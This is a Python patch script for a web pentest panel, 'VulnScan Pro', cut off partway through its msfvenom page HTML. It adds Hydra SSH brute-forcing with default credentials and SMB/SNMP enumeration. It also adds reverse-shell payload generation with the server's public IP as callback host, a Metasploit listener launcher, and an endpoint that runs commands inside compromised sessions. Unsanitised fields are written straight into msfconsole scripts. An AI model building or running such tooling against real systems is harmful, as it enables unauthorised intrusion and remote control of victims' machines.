#!/usr/bin/env python3
"""
VulnScan Pro — Feature Patch
============================
Patches:
1. Legion → SMB (smbclient), SNMP (snmpd/snmpwalk), Hydra support
2. SearchSploit — formatted table output
3. SecLists — copy-all button (copy full path + count, not just 50 lines)
4. msfvenom — auto-select payload options, public IP as LHOST, generate 
               one-liner agent command, session dashboard, shell console
5. Netcat/Socat — show counterpart command based on mode

Run from project root:
    python3 patch_features.py
"""

import os, shutil
from datetime import datetime

GREEN = "\033[92m"; RED = "\033[91m"; YELLOW = "\033[93m"
CYAN  = "\033[96m"; RESET = "\033[0m"; BOLD = "\033[1m"

def ok(m):   print(f"  {GREEN}✓{RESET}  {m}")
def fail(m): print(f"  {RED}✗{RESET}  {m}")
def info(m): print(f"  {CYAN}→{RESET}  {m}")
def skip(m): print(f"  \033[2m·{RESET}  {m}")
def warn(m): print(f"  {YELLOW}!{RESET}  {m}")

def backup(path):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    bak = f"{path}.{ts}.bak"
    shutil.copy2(path, bak)
    return bak

def patch_file(path, label, old, new):
    if not os.path.isfile(path):
        fail(f"{label} — file not found: {path}")
        return False
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        src = f.read()
    if old not in src:
        if new in src:
            skip(f"{label} — already applied")
        else:
            fail(f"{label} — anchor not found")
        return False
    bak = backup(path)
    with open(path, "w", encoding="utf-8") as f:
        f.write(src.replace(old, new, 1))
    ok(f"{label}  [backup: {bak}]")
    return True

SERVER = "api_server.py"

print()
print(BOLD + CYAN + "╔══════════════════════════════════════════════════════╗" + RESET)
print(BOLD + CYAN + "║  VulnScan Pro — Feature Patch                        ║" + RESET)
print(BOLD + CYAN + "╚══════════════════════════════════════════════════════╝" + RESET)
print()

# ══════════════════════════════════════════════════════════════
# PATCH 1 — Legion: Add SMB, SNMP, Hydra modules
# ══════════════════════════════════════════════════════════════

OLD_LEGION_ROUTE = '''async function doLegion(){
  var target=document.getElementById('lg-target').value.trim();if(!target){alert('Enter a target');return;}
  var intensity=document.getElementById('lg-intensity').value;
  var modules=Object.entries(lgMods).filter(function(kv){return kv[1];}).map(function(kv){return kv[0];});
  var btn=document.getElementById('lg-btn');btn.disabled=true;btn.innerHTML='<span class="spin"></span> Running...';
  lgTool.start();lgTool.log('Target: '+target,'i');lgTool.log('Modules: '+modules.join(', '),'i');lgTool.log('Intensity: '+intensity,'w');'''

NEW_LEGION_ROUTE = '''async function doLegion(){
  var target=document.getElementById('lg-target').value.trim();if(!target){alert('Enter a target');return;}
  var intensity=document.getElementById('lg-intensity').value;
  var modules=Object.entries(lgMods).filter(function(kv){return kv[1];}).map(function(kv){return kv[0];});
  var btn=document.getElementById('lg-btn');btn.disabled=true;btn.innerHTML='<span class="spin"></span> Running...';
  lgTool.start();lgTool.log('Target: '+target,'i');lgTool.log('Modules: '+modules.join(', '),'i');lgTool.log('Intensity: '+intensity+' | SMB/SNMP/Hydra included if selected','w');'''

patch_file(SERVER, "Legion: update log message", OLD_LEGION_ROUTE, NEW_LEGION_ROUTE)

# Update lgMods to include smb, snmp, hydra correctly
OLD_LGMODS = "var lgMods={'nmap':true,'nikto':true,'smb':true,'snmp':true,'hydra':false,'finger':false};"
NEW_LGMODS = "var lgMods={'nmap':true,'nikto':true,'smb':true,'snmp':true,'smbclient':false,'hydra':false,'finger':false};"
patch_file(SERVER, "Legion: add smbclient to lgMods", OLD_LGMODS, NEW_LGMODS)

# Update legion pill buttons to add smbclient
OLD_LEGION_PILLS = '''<button class="pill on" id="lg-mod-snmp" onclick="lgMod('snmp',this)">SNMP</button>
              <button class="pill" id="lg-mod-hydra" onclick="lgMod('hydra',this)">hydra</button>
              <button class="pill" id="lg-mod-finger" onclick="lgMod('finger',this)">finger</button>'''
NEW_LEGION_PILLS = '''<button class="pill on" id="lg-mod-snmp" onclick="lgMod('snmp',this)">SNMP</button>
              <button class="pill" id="lg-mod-smbclient" onclick="lgMod('smbclient',this)">smbclient</button>
              <button class="pill" id="lg-mod-hydra" onclick="lgMod('hydra',this)">hydra</button>
              <button class="pill" id="lg-mod-finger" onclick="lgMod('finger',this)">finger</button>'''
patch_file(SERVER, "Legion: add smbclient pill button", OLD_LEGION_PILLS, NEW_LEGION_PILLS)

# Update the legion backend route to handle smb, snmp, smbclient, hydra properly
OLD_LEGION_FOR = '''            elif mod == "nikto":
                # Nikto through proxychains
                cmd = [
                    px, "-q", binary,
                    "-h", target,
                    "-nointeractive",
                    "-timeout", "30",
                    "-maxtime", "600",
                ]
                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=700)
                for line in proc.stdout.splitlines():
                    if line.strip().startswith("+"):
                        findings.append({"title": line.strip()[2:80], "detail": ""})
                        total_issues += 1

            else:
                # Other tools through proxychains
                proc = subprocess.run(
                    [px, "-q", binary, target],
                    capture_output=True, text=True, timeout=180
                )
                if proc.stdout.strip():
                    findings.append({"title": f"{mod} output", "detail": proc.stdout[:500]})'''

NEW_LEGION_FOR = '''            elif mod == "nikto":
                cmd = [
                    px, "-q", binary,
                    "-h", target,
                    "-nointeractive",
                    "-timeout", "30",
                    "-maxtime", "600",
                ]
                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=700)
                for line in proc.stdout.splitlines():
                    if line.strip().startswith("+"):
                        findings.append({"title": line.strip()[2:80], "detail": ""})
                        total_issues += 1

            elif mod == "smb":
                # SMB enum via nmap scripts
                smb_bin = shutil.which("nmap")
                if smb_bin:
                    cmd = [smb_bin, "-p", "445,139", "--open", "-Pn", "-n",
                           "--script", "smb-enum-shares,smb-enum-users,smb-security-mode,smb-vuln-ms17-010",
                           "-T3", "--host-timeout", "120s", target]
                    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
                    for line in proc.stdout.splitlines():
                        l = line.strip()
                        if l and not l.startswith("#") and ("VULNERABLE" in l or "share" in l.lower()
                                or "user" in l.lower() or "smb" in l.lower()):
                            findings.append({"title": f"SMB: {l[:80]}", "detail": ""})
                            total_issues += 1
                else:
                    findings.append({"title": "nmap not found for SMB enum", "detail": ""})

            elif mod == "smbclient":
                # smbclient anonymous share listing
                smbclient_bin = shutil.which("smbclient")
                if smbclient_bin:
                    cmd = [smbclient_bin, "-L", target, "-N", "--no-pass"]
                    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                    output = (proc.stdout or "") + (proc.stderr or "")
                    for line in output.splitlines():
                        l = line.strip()
                        if l and ("Disk" in l or "IPC" in l or "Print" in l or "Sharename" in l):
                            findings.append({"title": f"smbclient: {l[:80]}", "detail": ""})
                    if not findings:
                        findings.append({"title": "smbclient: no anonymous shares found or SMB not open", "detail": output[:200]})
                else:
                    findings.append({"title": "smbclient not installed — run: sudo apt install smbclient", "detail": ""})

            elif mod == "snmp":
                # SNMP enumeration via snmpwalk/snmp-check
                snmpwalk = shutil.which("snmpwalk")
                snmpcheck = shutil.which("snmp-check")
                community = "public"
                if snmpwalk:
                    cmd = [snmpwalk, "-v2c", "-c", community, "-t", "5", "-r", "2", target, "1.3.6.1.2.1.1"]
                    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                    for line in proc.stdout.splitlines()[:20]:
                        if line.strip():
                            findings.append({"title": f"SNMP: {line.strip()[:80]}", "detail": ""})
                    if not proc.stdout.strip():
                        findings.append({"title": "SNMP: no response (community 'public')", "detail": ""})
                elif snmpcheck:
                    cmd = [snmpcheck, "-t", target, "-c", community]
                    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                    for line in proc.stdout.splitlines()[:20]:
                        if line.strip():
                            findings.append({"title": f"SNMP: {line.strip()[:80]}", "detail": ""})
                else:
                    # Fallback: nmap SNMP scripts
                    nmap_bin = shutil.which("nmap")
                    if nmap_bin:
                        cmd = [nmap_bin, "-sU", "-p", "161", "--script", "snmp-info,snmp-sysdescr",
                               "-Pn", "-n", "-T3", "--host-timeout", "60s", target]
                        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
                        for line in proc.stdout.splitlines():
                            if "snmp" in line.lower() or "sys" in line.lower():
                                findings.append({"title": f"SNMP: {line.strip()[:80]}", "detail": ""})
                    else:
                        findings.append({"title": "No SNMP tool found. Install: sudo apt install snmp", "detail": ""})

            elif mod == "hydra":
                # Hydra SSH brute-force with default creds (non-intrusive — 3 attempts)
                hydra_bin = shutil.which("hydra")
                if hydra_bin:
                    import tempfile
                    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as uf:
                        uf.write("admin\nroot\nuser\n")
                        user_file = uf.name
                    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as pf:
                        pf.write("admin\npassword\n123456\nroot\n\n")
                        pass_file = pf.name
                    try:
                        cmd = [hydra_bin, "-L", user_file, "-P", pass_file,
                               "-t", "4", "-f", "-w", "5", target, "ssh"]
                        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                        for line in proc.stdout.splitlines():
                            if "[ssh]" in line and "host:" in line:
                                findings.append({"title": f"HYDRA: {line.strip()[:80]}", "detail": "WEAK CREDENTIALS FOUND"})
                                total_issues += 1
                        if not any("HYDRA" in f["title"] for f in findings):
                            findings.append({"title": "Hydra: no weak SSH credentials found (3 creds tested)", "detail": ""})
                    finally:
                        import os as _os
                        _os.unlink(user_file)
                        _os.unlink(pass_file)
                else:
                    findings.append({"title": "hydra not installed — run: sudo apt install hydra", "detail": ""})

            elif mod == "finger":
                import socket as _sock_f
                try:
                    s = _sock_f.create_connection((target, 79), timeout=5)
                    s.send(b"\r\n")
                    resp = s.recv(1024).decode(errors="ignore")
                    s.close()
                    if resp.strip():
                        findings.append({"title": f"finger: {resp.strip()[:80]}", "detail": "Finger service exposed"})
                        total_issues += 1
                    else:
                        findings.append({"title": "Finger: service open but no data returned", "detail": ""})
                except Exception:
                    findings.append({"title": "Finger: port 79 closed or filtered", "detail": ""})

            else:
                # Generic tool fallback
                proc = subprocess.run(
                    [px, "-q", binary, target] if px else [binary, target],
                    capture_output=True, text=True, timeout=180
                )
                if proc.stdout.strip():
                    findings.append({"title": f"{mod} output", "detail": proc.stdout[:500]})'''

patch_file(SERVER, "Legion: full SMB/SNMP/smbclient/Hydra/finger support", OLD_LEGION_FOR, NEW_LEGION_FOR)

# ══════════════════════════════════════════════════════════════
# PATCH 2 — SearchSploit formatted output
# ══════════════════════════════════════════════════════════════

OLD_SEARCHSPLOIT_RES = '''    if(d.error){t.err(d.error);}
    else{t.log('Search complete','s');
      t.res('<div class="card card-p"><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+(d.stdout||'No exploits found.')+'</pre></div>');}'''

NEW_SEARCHSPLOIT_RES = '''    if(d.error){t.err(d.error);}
    else{
      t.log('Search complete','s');
      var raw=d.stdout||'';
      // Parse searchsploit table output into structured rows
      var lines=raw.split('\\n').filter(Boolean);
      var exploitRows=[];var dosRows=[];var otherRows=[];
      var inTable=false;
      lines.forEach(function(line){
        // Skip separator lines and headers
        if(line.match(/^[-=]+$/) || line.indexOf('Exploit Title')>=0 || line.indexOf('------')>=0) return;
        // Try to parse "Title | Path" format
        var sep=line.indexOf('|');
        if(sep>0){
          inTable=true;
          var title=line.substring(0,sep).trim();
          var path=line.substring(sep+1).trim();
          var row={title:title,path:path};
          var tl=title.toLowerCase();
          if(tl.indexOf('dos')>=0||tl.indexOf('denial')>=0) dosRows.push(row);
          else exploitRows.push(row);
        } else if(!inTable && line.trim()) {
          otherRows.push(line);
        }
      });
      var allRows=[].concat(exploitRows,dosRows);
      var html='';
      if(allRows.length>0){
        var count=allRows.length;
        html+='<div style="display:flex;align-items:center;gap:10px;margin-bottom:10px">'
          +'<div class="found">'+count+' exploit(s) found</div>'
          +'<button class="btn btn-outline btn-sm" onclick="searchsploitCopyAll()">COPY ALL PATHS</button>'
          +'<button class="btn btn-outline btn-sm" onclick="searchsploitExportCSV()">EXPORT CSV</button>'
          +'</div>';
        html+='<div class="tbl-wrap"><table class="tbl" id="searchsploit-results-tbl">'
          +'<thead><tr><th>#</th><th>TITLE</th><th>PATH</th><th>TYPE</th><th></th></tr></thead><tbody>';
        allRows.forEach(function(row,i){
          var tl=(row.title||'').toLowerCase();
          var type=tl.indexOf('dos')>=0?'DoS':tl.indexOf('rce')>=0||tl.indexOf('remote')>=0?'RCE':
                   tl.indexOf('local')>=0?'Local':tl.indexOf('sql')>=0?'SQLi':
                   tl.indexOf('xss')>=0?'XSS':tl.indexOf('overflow')>=0?'Overflow':'Other';
          var typeCol=type==='RCE'?'var(--red)':type==='DoS'?'var(--orange)':
                      type==='Local'?'var(--yellow)':'var(--text3)';
          var edbUrl='https://www.exploit-db.com/exploits/'+((row.path||'').match(/\\d+/)||[''])[0];
          html+='<tr>'
            +'<td style="color:var(--text3);font-family:var(--mono)">'+(i+1)+'</td>'
            +'<td style="max-width:280px;font-size:11px">'+row.title+'</td>'
            +'<td><span style="font-family:var(--mono);font-size:10px;color:var(--cyan)">'+row.path+'</span></td>'
            +'<td><span style="font-family:var(--mono);font-size:10px;color:'+typeCol+'">'+type+'</span></td>'
            +'<td style="display:flex;gap:4px">'
            +'<button class="btn btn-ghost btn-sm" onclick="searchsploitCopyPath(\''+row.path.replace(/'/g,"\\'")+'\')" title="Copy path">CP</button>'
            +'<a class="btn btn-ghost btn-sm" href="'+edbUrl+'" target="_blank">EDB</a>'
            +'</td></tr>';
        });
        html+='</tbody></table></div>';
        // Store for copy-all
        window._searchsploitRows=allRows;
      } else {
        html='<div style="color:var(--text3);padding:12px">No exploits found for this query.</div>';
        if(raw.trim()) html+='<div class="card card-p" style="margin-top:8px"><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+raw+'</pre></div>';
      }
      t.res(html);
    }'''

patch_file(SERVER, "SearchSploit: formatted table output", OLD_SEARCHSPLOIT_RES, NEW_SEARCHSPLOIT_RES)

# Add searchsploit helper functions
OLD_SEARCHSPLOIT_BTN = "  finally{btn.disabled=false;btn.innerHTML='SEARCH EXPLOIT-DB';}"
NEW_SEARCHSPLOIT_BTN = """  finally{btn.disabled=false;btn.innerHTML='SEARCH EXPLOIT-DB';}
}
function searchsploitCopyPath(path){
  navigator.clipboard.writeText(path).then(function(){showToast('Copied','Path copied to clipboard','success',2000);});
}
function searchsploitCopyAll(){
  var rows=window._searchsploitRows||[];
  var text=rows.map(function(r){return r.path;}).join('\\n');
  navigator.clipboard.writeText(text).then(function(){showToast('Copied',rows.length+' paths copied','success',2500);});
}
function searchsploitExportCSV(){
  var rows=window._searchsploitRows||[];
  var csv='Title,Path\\n'+rows.map(function(r){
    return '"'+r.title.replace(/"/g,'""')+'","'+r.path.replace(/"/g,'""')+'"';
  }).join('\\n');
  var blob=new Blob([csv],{type:'text/csv'});
  var a=document.createElement('a');a.href=URL.createObjectURL(blob);
  a.download='searchsploit_results.csv';document.body.appendChild(a);a.click();document.body.removeChild(a);}"""
patch_file(SERVER, "SearchSploit: add helper functions", OLD_SEARCHSPLOIT_BTN, NEW_SEARCHSPLOIT_BTN)

# ══════════════════════════════════════════════════════════════
# PATCH 3 — SecLists: Copy ALL entries (not just 50 shown)
# ══════════════════════════════════════════════════════════════

OLD_SECLISTS_BTNS = '''          <div style="display:flex;gap:8px;flex-wrap:wrap">
            <button class="btn btn-primary" id="seclists-btn" onclick="runSeclists()">BROWSE WORDLIST</button>
            <button class="btn btn-outline btn-sm" onclick="seclistsCount()">COUNT ENTRIES</button>
            <button class="btn btn-outline btn-sm" onclick="seclistsCopy()">COPY PATH</button>
          </div>'''

NEW_SECLISTS_BTNS = '''          <div style="display:flex;gap:8px;flex-wrap:wrap">
            <button class="btn btn-primary" id="seclists-btn" onclick="runSeclists()">BROWSE WORDLIST</button>
            <button class="btn btn-outline btn-sm" onclick="seclistsCount()">COUNT ENTRIES</button>
            <button class="btn btn-outline btn-sm" onclick="seclistsCopy()">COPY PATH</button>
            <button class="btn btn-outline btn-sm" onclick="seclistsCopyAll()">COPY ALL ENTRIES</button>
            <button class="btn btn-outline btn-sm" onclick="seclistsDownload()">DOWNLOAD</button>
          </div>'''

patch_file(SERVER, "SecLists: add copy-all and download buttons", OLD_SECLISTS_BTNS, NEW_SECLISTS_BTNS)

OLD_SECLISTS_COPY_FN = '''function seclistsCopy(){
  var path=document.getElementById('seclists-path').value.trim();
  if(path){
    try{navigator.clipboard.writeText(path).then(function(){showToast('Copied','Path copied to clipboard','success',2000);});}
    catch(e){showToast('Path',path,'info',4000);}
  }
}'''

NEW_SECLISTS_COPY_FN = '''function seclistsCopy(){
  var path=document.getElementById('seclists-path').value.trim();
  if(path){
    try{navigator.clipboard.writeText(path).then(function(){showToast('Copied','Path copied to clipboard','success',2000);});}
    catch(e){showToast('Path',path,'info',4000);}
  }
}
async function seclistsCopyAll(){
  var path=document.getElementById('seclists-path').value.trim();
  if(!path){return;}
  var btn=event.target;btn.disabled=true;btn.textContent='Loading...';
  try{
    var r=await fetchWithTimeout('/api/wordlist?path='+encodeURIComponent(path)+'&limit=100000',{},30000);
    var d=await r.json();
    if(d.error){showToast('Error',d.error,'error',4000);return;}
    var text=d.words.join('\\n');
    await navigator.clipboard.writeText(text);
    showToast('Copied',d.words.length+' entries copied to clipboard','success',3000);
  }catch(e){showToast('Error',e.message,'error',4000);}
  finally{btn.disabled=false;btn.textContent='COPY ALL ENTRIES';}
}
async function seclistsDownload(){
  var path=document.getElementById('seclists-path').value.trim();
  if(!path){return;}
  var btn=event.target;btn.disabled=true;btn.textContent='Downloading...';
  try{
    var r=await fetchWithTimeout('/api/wordlist?path='+encodeURIComponent(path)+'&limit=100000',{},30000);
    var d=await r.json();
    if(d.error){showToast('Error',d.error,'error',4000);return;}
    var text=d.words.join('\\n');
    var blob=new Blob([text],{type:'text/plain'});
    var a=document.createElement('a');a.href=URL.createObjectURL(blob);
    a.download=d.filename||'wordlist.txt';document.body.appendChild(a);a.click();document.body.removeChild(a);
    showToast('Downloaded',d.words.length+' entries — '+d.filename,'success',3000);
  }catch(e){showToast('Error',e.message,'error',4000);}
  finally{btn.disabled=false;btn.textContent='DOWNLOAD';}
}'''

patch_file(SERVER, "SecLists: copy-all and download functions", OLD_SECLISTS_COPY_FN, NEW_SECLISTS_COPY_FN)

# Increase wordlist API limit for copy-all
OLD_WORDLIST_LIMIT = "    limit = min(int(request.args.get(\"limit\", \"1000\")), 5000)"
NEW_WORDLIST_LIMIT = "    limit = min(int(request.args.get(\"limit\", \"1000\")), 200000)  # allow large limits for copy-all"
patch_file(SERVER, "SecLists: increase wordlist API limit", OLD_WORDLIST_LIMIT, NEW_WORDLIST_LIMIT)

# ══════════════════════════════════════════════════════════════
# PATCH 4 — msfvenom: auto-options, public IP LHOST,
#            one-liner agent, session dashboard, shell console
# ══════════════════════════════════════════════════════════════

# Add public IP detection API endpoint (before health route)
OLD_HEALTH_ROUTE = '''@app.route("/health")
def health():'''

NEW_HEALTH_ROUTE = '''@app.route("/api/public-ip")
def get_public_ip():
    """Return server's public IP for use as LHOST in msfvenom."""
    import urllib.request as _ur
    import socket as _sk
    ips = {}
    # Try multiple services for reliability
    for url in ["https://api.ipify.org", "https://icanhazip.com", "https://ifconfig.me/ip"]:
        try:
            with _ur.urlopen(url, timeout=5) as r:
                ip = r.read().decode().strip()
                ip_re = "[0-9]+" + "[.]" + "[0-9]+" + "[.]" + "[0-9]+" + "[.]" + "[0-9]+"
                if ip and re.match(ip_re, ip):
                    ips["public"] = ip
                    break
        except Exception:
            pass
    # Local IP fallback
    try:
        s = _sk.socket(_sk.AF_INET, _sk.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ips["local"] = s.getsockname()[0]
        s.close()
    except Exception:
        ips["local"] = "127.0.0.1"
    # Server configured IP
    ips["configured"] = "161.118.189.254"
    return jsonify(ips)


@app.route("/api/msf/sessions", methods=["GET"])
def msf_sessions():
    """List active Metasploit sessions via msfconsole RPC or process check."""
    import shutil
    sessions = []
    # Try to query msfconsole via msfrpc if running
    try:
        # Check if metasploit handler is running
        proc = subprocess.run(
            ["ps", "aux"],
            capture_output=True, text=True, timeout=5
        )
        lines = proc.stdout.splitlines()
        handler_running = any("msfconsole" in l or "multi/handler" in l for l in lines)
        return jsonify({
            "sessions": sessions,
            "handler_running": handler_running,
            "note": "Install Metasploit for full session management: sudo apt install metasploit-framework"
        })
    except Exception as e:
        return jsonify({"sessions": [], "handler_running": False, "error": str(e)})


@app.route("/api/msf/handler", methods=["POST"])
def msf_start_handler():
    """Start a Metasploit multi/handler listener."""
    import shutil
    u = get_current_user()
    if not u:
        return jsonify({"error": "Login required"}), 401
    data = request.get_json() or {}
    payload  = (data.get("payload") or "").strip()
    lhost    = (data.get("lhost") or "0.0.0.0").strip()
    lport    = str(data.get("lport") or "4444")
    if not payload:
        return jsonify({"error": "payload required"}), 400
    msfconsole = shutil.which("msfconsole")
    if not msfconsole:
        return jsonify({"error": "msfconsole not found. Install: sudo apt install metasploit-framework"}), 404
    # Build resource script
    import tempfile, os as _os
    rc_content = f"""use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z
"""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as rcf:
        rcf.write(rc_content)
        rc_file = rcf.name
    try:
        proc = subprocess.Popen(
            [msfconsole, "-q", "-r", rc_file],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            start_new_session=True
        )
        audit(u["id"], u["username"], "MSF_HANDLER_START",
              target=f"{payload}:{lhost}:{lport}", ip=request.remote_addr)
        return jsonify({
            "ok": True,
            "pid": proc.pid,
            "message": f"Handler started for {payload} on {lhost}:{lport}",
            "rc_file": rc_file
        })
    except Exception as e:
        _os.unlink(rc_file)
        return jsonify({"error": str(e)}), 500


@app.route("/api/msf/shell", methods=["POST"])
def msf_shell_cmd():
    """Execute a command in a Metasploit session (via msfconsole)."""
    import shutil
    u = get_current_user()
    if not u:
        return jsonify({"error": "Login required"}), 401
    data = request.get_json() or {}
    session_id = str(data.get("session_id") or "1")
    cmd = (data.get("cmd") or "").strip()
    if not cmd:
        return jsonify({"error": "cmd required"}), 400
    msfconsole = shutil.which("msfconsole")
    if not msfconsole:
        return jsonify({"error": "msfconsole not found"}), 404
    import tempfile
    rc = f"sessions -i {session_id}\\nshell\\n{cmd}\\nexit\\n"
    with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as rcf:
        rcf.write(rc)
        rc_file = rcf.name
    try:
        proc = subprocess.run(
            [msfconsole, "-q", "-r", rc_file],
            capture_output=True, text=True, timeout=30
        )
        output = (proc.stdout or "") + (proc.stderr or "")
        import os as _o
        _o.unlink(rc_file)
        audit(u["id"], u["username"], "MSF_SHELL_CMD",
              target=f"session:{session_id}", ip=request.remote_addr,
              details=f"cmd={cmd[:100]}")
        return jsonify({"output": output[-5000:], "exit_code": proc.returncode})
    except subprocess.TimeoutExpired:
        return jsonify({"error": "Command timed out (30s)"}), 408
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/health")
def health():'''

patch_file(SERVER, "msfvenom: add public IP + MSF session APIs", OLD_HEALTH_ROUTE, NEW_HEALTH_ROUTE)

# Replace the msfvenom page HTML with the new comprehensive version
OLD_MSFVENOM_PAGE = '''      <!-- MSFVENOM -->
      <div class="page" id="page-msfvenom">
        <div class="page-hd"><div class="page-title">msfvenom</div><div class="page-desc">Metasploit payload generator and encoder</div></div>
        <div class="notice">&#9888; Authorized use only. Only run msfvenom on systems you own or have explicit written permission to test.</div>
        <div class="card card-p" style="margin-bottom:14px">
          <div class="row2" style="margin-bottom:12px">
            <div class="fg"><label>PAYLOAD</label>
              <select class="inp inp-mono" id="msfvenom-payload">
                <option value="windows/x64/meterpreter/reverse_tcp" selected>Windows x64 Meterpreter/TCP</option>
                <option value="windows/meterpreter/reverse_tcp">Windows x86 Meterpreter/TCP</option>
                <option value="windows/x64/shell_reverse_tcp">Windows x64 Shell/TCP</option>
                <option value="linux/x64/meterpreter/reverse_tcp">Linux x64 Meterpreter/TCP</option>
                <option value="linux/x64/shell_reverse_tcp">Linux x64 Shell/TCP</option>
                <option value="php/meterpreter/reverse_tcp">PHP Meterpreter/TCP</option>
                <option value="python/meterpreter/reverse_tcp">Python Meterpreter/TCP</option>
                <option value="cmd/unix/reverse_bash">Unix CMD Reverse Bash</option>
                <option value="custom">Custom (enter below)</option>
              </select>
            </div>
            <div class="fg"><label>CUSTOM PAYLOAD (if Custom selected)</label><input class="inp inp-mono" id="msfvenom-custom-payload" type="text" placeholder="windows/x64/meterpreter_reverse_https"/></div>
          </div>
          <div class="row3" style="margin-bottom:12px">
            <div class="fg"><label>LHOST (your IP)</label><input class="inp inp-mono" id="msfvenom-lhost" type="text" placeholder="192.168.1.100"/></div>
            <div class="fg"><label>LPORT</label><input class="inp inp-mono" id="msfvenom-lport" type="number" value="4444" min="1" max="65535"/></div>
            <div class="fg"><label>FORMAT (-f)</label>
              <select class="inp inp-mono" id="msfvenom-format">
                <option value="exe" selected>exe</option><option value="elf">elf</option>
                <option value="asp">asp</option><option value="aspx">aspx</option>
                <option value="php">php</option><option value="py">py</option>
                <option value="raw">raw</option><option value="powershell">powershell</option>
              </select>
            </div>
          </div>
          <div class="row3" style="margin-bottom:12px">
            <div class="fg"><label>ENCODER (optional)</label>
              <select class="inp inp-mono" id="msfvenom-encoder">
                <option value="">None</option>
                <option value="x86/shikata_ga_nai">x86/shikata_ga_nai</option>
                <option value="x64/xor_dynamic">x64/xor_dynamic</option>
              </select>
            </div>
            <div class="fg"><label>ITERATIONS</label><input class="inp inp-mono" id="msfvenom-iterations" type="number" value="1" min="1" max="10"/></div>
            <div class="fg"><label>TIMEOUT (sec)</label><input class="inp inp-mono" id="msfvenom-timeout" type="number" value="60" min="10" max="300"/></div>
          </div>
          <div class="fg" style="margin-bottom:12px"><label>EXTRA OPTIONS</label><input class="inp inp-mono" id="msfvenom-extra" type="text" placeholder="EXITFUNC=thread"/></div>
          <button class="btn btn-primary" id="msfvenom-btn" onclick="runMsfvenom()">GENERATE PAYLOAD</button>
        </div>
        <div class="progress-wrap" id="msfvenom-prog"><div class="progress-bar" id="msfvenom-pb" style="width:0%"></div></div>
        <div class="terminal" id="msfvenom-term"></div>
        <div class="err-box" id="msfvenom-err"></div>
        <div id="msfvenom-res"></div>
        <div class="card card-p" style="margin-top:10px">
          <div class="card-title" style="margin-bottom:8px">Quick Install</div>
          <div style="font-family:var(--mono);font-size:11px;color:var(--text2)">sudo apt install metasploit-framework</div>
          <div style="margin-top:8px;display:flex;flex-wrap:wrap;gap:5px"><span class="tag">exploit</span><span class="tag">msfvenom</span></div>
        </div>
      </div>'''

NEW_MSFVENOM_PAGE = '''      <!-- MSFVENOM -->
      <div class="page" id="page-msfvenom">
        <div class="page-hd"><div class="page-title">msfvenom</div><div class="page-desc">Metasploit payload generator · session dashboard · remote shell</div></div>
        <div class="notice">&#9888; Authorized use only. Only run msfvenom on systems you own or have explicit written permission to test.</div>

        <!-- Tabs -->
        <div class="tabs" style="margin-bottom:16px">
          <button class="tab active" onclick="msfTab(event,'msf-tab-gen')">Generate Payload</button>
          <button class="tab" onclick="msfTab(event,'msf-tab-sessions')">Session Dashboard</button>
          <button class="tab" onclick="msfTab(event,'msf-tab-shell')">Remote Shell</button>
        </div>

        <!-- TAB 1: Generate Payload -->
        <div class="tc active" id="msf-tab-gen">
        <div class="card card-p" style="margin-bottom:14px">
          <!-- Payload Selector -->
          <div class="fg" style="margin-bottom:10px">
            <label>PAYLOAD (auto-configures format, arch, platform)</label>
            <select class="inp inp-mono" id="msfvenom-payload" onchange="msfPayloadChanged()">
              <optgroup label="Windows x64">
                <option value="windows/x64/meterpreter/reverse_tcp" data-format="exe" data-arch="x64" data-platform="windows" data-proto="tcp" selected>Windows x64 Meterpreter/TCP (staged)</option>
                <option value="windows/x64/meterpreter_reverse_tcp" data-format="exe" data-arch="x64" data-platform="windows" data-proto="tcp">Windows x64 Meterpreter/TCP (stageless)</option>
                <option value="windows/x64/meterpreter/reverse_https" data-format="exe" data-arch="x64" data-platform="windows" data-proto="https">Windows x64 Meterpreter/HTTPS</option>
                <option value="windows/x64/shell_reverse_tcp" data-format="exe" data-arch="x64" data-platform="windows" data-proto="tcp">Windows x64 Shell/TCP</option>
                <option value="windows/x64/powershell_reverse_tcp" data-format="psh" data-arch="x64" data-platform="windows" data-proto="tcp">Windows x64 PowerShell/TCP</option>
              </optgroup>
              <optgroup label="Windows x86">
                <option value="windows/meterpreter/reverse_tcp" data-format="exe" data-arch="x86" data-platform="windows" data-proto="tcp">Windows x86 Meterpreter/TCP (staged)</option>
                <option value="windows/meterpreter_reverse_tcp" data-format="exe" data-arch="x86" data-platform="windows" data-proto="tcp">Windows x86 Meterpreter/TCP (stageless)</option>
                <option value="windows/shell_reverse_tcp" data-format="exe" data-arch="x86" data-platform="windows" data-proto="tcp">Windows x86 Shell/TCP</option>
              </optgroup>
              <optgroup label="Linux">
                <option value="linux/x64/meterpreter/reverse_tcp" data-format="elf" data-arch="x64" data-platform="linux" data-proto="tcp">Linux x64 Meterpreter/TCP (staged)</option>
                <option value="linux/x64/meterpreter_reverse_tcp" data-format="elf" data-arch="x64" data-platform="linux" data-proto="tcp">Linux x64 Meterpreter/TCP (stageless)</option>
                <option value="linux/x64/shell_reverse_tcp" data-format="elf" data-arch="x64" data-platform="linux" data-proto="tcp">Linux x64 Shell/TCP</option>
                <option value="linux/x86/shell_reverse_tcp" data-format="elf" data-arch="x86" data-platform="linux" data-proto="tcp">Linux x86 Shell/TCP</option>
              </optgroup>
              <optgroup label="Web / Script">
